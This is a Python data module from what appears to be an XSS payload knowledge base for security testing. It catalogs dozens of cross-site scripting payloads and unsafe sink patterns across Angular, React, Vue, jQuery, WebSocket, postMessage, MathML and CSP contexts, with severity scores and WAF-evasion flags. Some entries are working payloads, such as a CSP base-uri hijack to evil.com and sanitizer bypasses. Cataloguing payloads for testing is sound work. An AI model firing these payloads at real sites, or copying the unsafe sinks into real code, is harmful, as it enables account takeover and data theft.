#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Active
Telegram: https://t.me/EasyProTech

Critical Context Enrichment
Payloads for critically important security contexts.
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


# === Angular Additional ===
ANGULAR_CRITICAL_PAYLOADS = {
    "angular-bypassSecurityTrustHtml": PayloadEntry(
        payload="this.sanitizer.bypassSecurityTrustHtml(userInput)",
        contexts=["angular", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Angular DomSanitizer bypass",
        tags=["angular", "sanitizer", "bypass", "trust"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "angular-bypassSecurityTrustUrl": PayloadEntry(
        payload='this.sanitizer.bypassSecurityTrustUrl("javascript:alert(1)")',
        contexts=["angular", "javascript", "url"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Angular URL sanitizer bypass",
        tags=["angular", "sanitizer", "url", "bypass"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "angular-ng-bind-html": PayloadEntry(
        payload='<div ng-bind-html="userInput"></div>',
        contexts=["angular", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Angular ng-bind-html directive",
        tags=["angular", "ng-bind-html", "directive", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "angular-trustAsHtml": PayloadEntry(
        payload="$sce.trustAsHtml(userInput)",
        contexts=["angular", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Angular $sce.trustAsHtml (AngularJS)",
        tags=["angular", "sce", "trustAsHtml", "angularjs"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === React Additional ===
REACT_CRITICAL_PAYLOADS = {
    "react-createPortal": PayloadEntry(
        payload="ReactDOM.createPortal(<div dangerouslySetInnerHTML={{__html:userInput}}/>,document.body)",
        contexts=["react", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="React createPortal with XSS",
        tags=["react", "portal", "dangerously", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "react-Fragment-key": PayloadEntry(
        payload="<React.Fragment key={userInput}><div dangerouslySetInnerHTML={{__html:html}}/></React.Fragment>",
        contexts=["react", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="React Fragment with XSS content",
        tags=["react", "fragment", "dangerously", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Vue Additional ===
VUE_CRITICAL_PAYLOADS = {
    "vue-render-function": PayloadEntry(
        payload='render(h){return h("div",{domProps:{innerHTML:this.userInput}})}',
        contexts=["vue", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Vue render function innerHTML",
        tags=["vue", "render", "function", "innerHTML"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "vue-v-slot": PayloadEntry(
        payload='<template v-slot:[userInput]><div v-html="html"></div></template>',
        contexts=["vue", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Vue dynamic slot with v-html",
        tags=["vue", "slot", "dynamic", "v-html"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === jQuery Additional ===
JQUERY_CRITICAL_PAYLOADS = {
    "jquery-globalEval": PayloadEntry(
        payload="$.globalEval(userInput)",
        contexts=["jquery", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="jQuery globalEval code execution",
        tags=["jquery", "globalEval", "eval", "rce"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "jquery-parseHTML": PayloadEntry(
        payload="$.parseHTML(userInput, true)",
        contexts=["jquery", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="jQuery parseHTML with scripts",
        tags=["jquery", "parseHTML", "scripts", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "jquery-getScript": PayloadEntry(
        payload="$.getScript(userUrl)",
        contexts=["jquery", "javascript", "url"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="jQuery getScript remote execution",
        tags=["jquery", "getScript", "remote", "rce"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === WebSocket Additional ===
WEBSOCKET_CRITICAL_PAYLOADS = {
    "websocket-binaryType": PayloadEntry(
        payload='ws.binaryType = "arraybuffer"; ws.onmessage = (e) => { const decoder = new TextDecoder(); eval(decoder.decode(e.data)); }',
        contexts=["websocket", "websocket_handler", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="WebSocket binary to eval",
        tags=["websocket", "binary", "arraybuffer", "eval"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "websocket-close-reason": PayloadEntry(
        payload="ws.onclose = (e) => { document.body.innerHTML = e.reason; }",
        contexts=["websocket", "websocket_handler", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="WebSocket close reason to innerHTML",
        tags=["websocket", "close", "reason", "innerHTML"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Sanitizer API Additional ===
SANITIZER_CRITICAL_PAYLOADS = {
    "sanitizer-allowAttributes": PayloadEntry(
        payload='new Sanitizer({allowAttributes: {"onerror": ["img"]}})',
        contexts=["sanitizer_api", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Sanitizer API allowing event handlers",
        tags=["sanitizer-api", "allowAttributes", "onerror", "unsafe"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "sanitizer-dropAttributes-bypass": PayloadEntry(
        payload="<img src=x onERRor=alert(1)>",
        contexts=["sanitizer_api", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Sanitizer case-sensitive bypass attempt",
        tags=["sanitizer-api", "case", "bypass", "event"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Trusted Types Additional ===
TRUSTED_TYPES_CRITICAL_PAYLOADS = {
    "tt-createScript": PayloadEntry(
        payload="policy.createScript(userInput)",
        contexts=["trusted_types", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="Trusted Types createScript with user input",
        tags=["trusted-types", "createScript", "policy", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "tt-createScriptURL": PayloadEntry(
        payload="policy.createScriptURL(userInput)",
        contexts=["trusted_types", "javascript", "url"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="Trusted Types createScriptURL with user input",
        tags=["trusted-types", "createScriptURL", "url", "policy"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Storage Additional ===
STORAGE_CRITICAL_PAYLOADS = {
    "storage-prototype-pollution": PayloadEntry(
        payload='const data = JSON.parse(localStorage.getItem("user")); Object.assign(target, data);',
        contexts=["storage", "javascript", "prototype_pollution"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="localStorage to prototype pollution",
        tags=["storage", "prototype", "pollution", "json"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "storage-cross-tab": PayloadEntry(
        payload='window.onstorage = (e) => { if(e.key === "xss") eval(e.newValue); }',
        contexts=["storage", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Cross-tab storage event eval",
        tags=["storage", "cross-tab", "event", "eval"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Cookie Additional ===
COOKIE_CRITICAL_PAYLOADS = {
    "cookie-httpOnly-bypass": PayloadEntry(
        payload='// XSS can\'t steal httpOnly cookies but can perform actions\nfetch("/api/transfer", {credentials: "include"})',
        contexts=["cookie", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="httpOnly bypass via authenticated requests",
        tags=["cookie", "httpOnly", "bypass", "csrf"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "cookie-set-domain": PayloadEntry(
        payload='document.cookie = "xss=payload; domain=.example.com; path=/"',
        contexts=["cookie", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=6.0,
        description="Cookie set on parent domain",
        tags=["cookie", "domain", "scope", "persist"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === PostMessage Additional ===
POSTMESSAGE_CRITICAL_PAYLOADS = {
    "postmessage-origin-regex": PayloadEntry(
        payload='window.addEventListener("message", (e) => { if(/trusted/.test(e.origin)) eval(e.data); })',
        contexts=["postmessage", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="postMessage weak origin regex",
        tags=["postmessage", "origin", "regex", "bypass"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "postmessage-iframe-sandbox": PayloadEntry(
        payload="<iframe sandbox=\"allow-scripts allow-same-origin\" srcdoc=\"<script>parent.postMessage('xss','*')</script>\"></iframe>",
        contexts=["postmessage", "html_content", "iframe_sandbox"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Sandboxed iframe postMessage",
        tags=["postmessage", "iframe", "sandbox", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === MathML Additional ===
MATHML_CRITICAL_PAYLOADS = {
    "mathml-annotation-html": PayloadEntry(
        payload='<math><annotation-xml encoding="application/xhtml+xml"><html xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></html></annotation-xml></math>',
        contexts=["mathml", "html_content", "xml"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="MathML annotation-xml XHTML namespace",
        tags=["mathml", "annotation", "xhtml", "namespace"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "mathml-maction": PayloadEntry(
        payload='<math><maction actiontype="statusline#http://evil.com"><mtext>XSS</mtext></maction></math>',
        contexts=["mathml", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="MathML maction statusline",
        tags=["mathml", "maction", "statusline", "leak"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "mathml-href": PayloadEntry(
        payload='<math><mtext href="javascript:alert(1)">Click</mtext></math>',
        contexts=["mathml", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="MathML href javascript protocol",
        tags=["mathml", "href", "javascript", "xss"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSP Context ===
CSP_CRITICAL_PAYLOADS = {
    "csp-nonce-reuse": PayloadEntry(
        payload='<script nonce="REUSED_NONCE">alert(1)</script>',
        contexts=["csp_bypass", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="CSP nonce reuse attack",
        tags=["csp", "nonce", "reuse", "bypass"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "csp-base-uri": PayloadEntry(
        payload='<base href="https://evil.com/">',
        contexts=["csp_bypass", "html_content"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="CSP bypass via base-uri",
        tags=["csp", "base", "uri", "bypass"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "csp-object-src": PayloadEntry(
        payload='<object data="data:text/html,<script>alert(1)</script>"></object>',
        contexts=["csp_bypass", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="CSP bypass via object-src",
        tags=["csp", "object", "src", "bypass"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# Combined
CRITICAL_ENRICHMENT_PAYLOADS = {
    **ANGULAR_CRITICAL_PAYLOADS,
    **REACT_CRITICAL_PAYLOADS,
    **VUE_CRITICAL_PAYLOADS,
    **JQUERY_CRITICAL_PAYLOADS,
    **WEBSOCKET_CRITICAL_PAYLOADS,
    **SANITIZER_CRITICAL_PAYLOADS,
    **TRUSTED_TYPES_CRITICAL_PAYLOADS,
    **STORAGE_CRITICAL_PAYLOADS,
    **COOKIE_CRITICAL_PAYLOADS,
    **POSTMESSAGE_CRITICAL_PAYLOADS,
    **MATHML_CRITICAL_PAYLOADS,
    **CSP_CRITICAL_PAYLOADS,
}

CRITICAL_ENRICHMENT_TOTAL = len(CRITICAL_ENRICHMENT_PAYLOADS)
